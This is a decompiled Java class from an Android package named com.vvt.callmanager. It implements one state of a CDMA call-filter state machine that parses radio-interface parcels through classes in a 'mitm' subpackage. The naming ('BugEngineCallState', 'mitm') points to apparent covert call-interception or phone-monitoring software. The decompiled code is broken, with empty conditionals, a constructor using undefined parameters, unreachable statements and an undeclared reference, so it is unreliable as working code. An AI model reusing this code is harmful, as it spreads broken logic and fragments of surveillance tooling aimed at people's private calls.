package com.vvt.callmanager.filter;

import android.os.Parcel;
import com.vvt.callmanager.a.d;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.mitm.a;
import com.vvt.callmanager.ref.BugEngineCallState;
import java.util.ArrayList;

 enum FilterCdmaCall$CallState$2
{
  private Object transition;
  
  FilterCdmaCall$CallState$2()
  {
    super(paramString, paramInt, null);
  }
  
  public void onEnter(Object paramObject)
  {
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    this.transition = null;
    FilterCdmaCall localFilterCdmaCall = this.mFilterCall;
    BugEngineCallState localBugEngineCallState = BugEngineCallState.CDMA_DIALING_RINGING;
    FilterCdmaCall.a(localFilterCdmaCall, localBugEngineCallState);
  }
  
  public Object onExit()
  {
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    return this.transition;
  }
  
  public FilterCdmaCall.CallState processResponse(Parcel paramParcel)
  {
    int i = 1;
    Object localObject1 = FilterCdmaCall.a(this.mFilterCall);
    int j = ((m)localObject1).c(paramParcel);
    int k = 9;
    ArrayList localArrayList;
    int m;
    Object localObject2;
    if (j == k)
    {
      localObject1 = l.a(paramParcel);
      j = ((l)localObject1).b;
      k = 134744072;
      if (j != k)
      {
        j = i;
        localArrayList = d.a(paramParcel);
        String str = "FilterCall";
        a locala = FilterCdmaCall.a(this.mFilterCall).a();
        i.a(str, localArrayList, locala);
        m = localArrayList.size();
        if (m != 0) {
          break label127;
        }
        localObject2 = FilterCdmaCall.CallState.IDLE;
      }
    }
    for (;;)
    {
      if (j != 0)
      {
        localObject1 = this.mFilterCall;
        ((FilterCdmaCall)localObject1).c(paramParcel);
      }
      return (FilterCdmaCall.CallState)localObject2;
      j = 0;
      localObject1 = null;
      break;
      label127:
      m = localArrayList.size();
      if (m == i)
      {
        localObject2 = (d)localArrayList.get(0);
        i = ((d)localObject2).c();
        if (i == 0)
        {
          localObject2 = localArrayList.get(0);
          this.transition = localObject2;
          localObject2 = FilterCdmaCall.CallState.ONE_ACTIVE_CALL;
          continue;
        }
      }
      localObject2 = this;
      continue;
      j = i;
      localObject2 = this;
    }
  }
  
  public FilterCdmaCall.CallState processRilRequest(Parcel paramParcel)
  {
    FilterCdmaCall.a(this.mFilterCall).b(paramParcel);
    this.mFilterCall.d(paramParcel);
    return this;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterCdmaCall$CallState$2.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */